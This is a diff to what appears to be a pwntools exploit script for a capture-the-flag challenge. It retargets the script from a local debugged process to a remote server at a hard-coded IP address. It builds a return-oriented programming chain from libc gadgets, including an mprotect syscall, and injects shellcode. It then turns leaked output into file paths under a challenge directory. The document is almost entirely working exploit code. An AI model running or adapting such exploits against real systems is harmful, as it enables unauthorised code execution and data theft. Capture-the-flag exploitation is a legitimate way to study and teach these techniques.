@@ -4,14 +4,14 @@ import re
 import string
 exe = ELF('./chall_patched')
 libc = ELF('./libc.so.6')
-p = process(exe.path)
-# p = remote('3.75.185.198',10000)
-context.terminal = ['alacritty', '-e']
-gdb.attach(p, gdbscript='''
-# b*0x401100
-           b*0x000000000040148c
-b*read+16
-           ''')
+# p = process(exe.path)
+p = remote('3.75.185.198',10000)
+# context.terminal = ['alacritty', '-e']
+# gdb.attach(p, gdbscript='''
+# # b*0x401100
+#            b*0x000000000040148c
+# b*read+16
+#            ''')
 #################exploiting#####################
 shellcode = asm('''
 
@@ -78,9 +78,6 @@ pop_rdi = libc.address + 0x000000000002a3e5
 pop_rsi = libc.address + 0x000000000002be51 
 pop_rdx = libc.address + 0x0000000000170337 
 mov_rdi_rax = libc.address + 2 
-path_to_target =  0x0000000000404a4e
-push_rax = libc.address + 0x0000000000041563
-shell_section = 0x0000000000402698
 ###############################33
 
 
@@ -91,10 +88,9 @@ log.info(f'syscall: {hex(syscall)}')
 ####################
 
 
-shell_addr = 0x404a5e        #rbp
 
 
-payload = p64(0x0000000000404da8)
+payload = p64(0)
 ###########################
 payload += p64(pop_rax)+ p64(0xa)
 payload += p64(pop_rdi) + p64(0x0000000000404000)
@@ -133,9 +129,9 @@ p.send(payload)
 printable_bytes = [byte for byte in p.recvall() if 32 <= byte <= 126 or byte in [10, 13]]
 cleanlmao = bytes(printable_bytes)
 clean = re.sub(b'[^a-zA-Z0-9]', b' ',cleanlmao)[6:-568]
-suprclean = [ (b'/home/pwn/maze/' + b) for b in clean.split(b' ') if 1< len(b) <17  ]
+suprclean = [ (b'/home/pwn/maze/' + b).ljust(31,b'\x00') for b in clean.split(b' ') if 1< len(b) <17  ]
 
-print(b' '.join(suprclean))
+print(b''.join(suprclean))
 
 # print(cleanlmao)
 
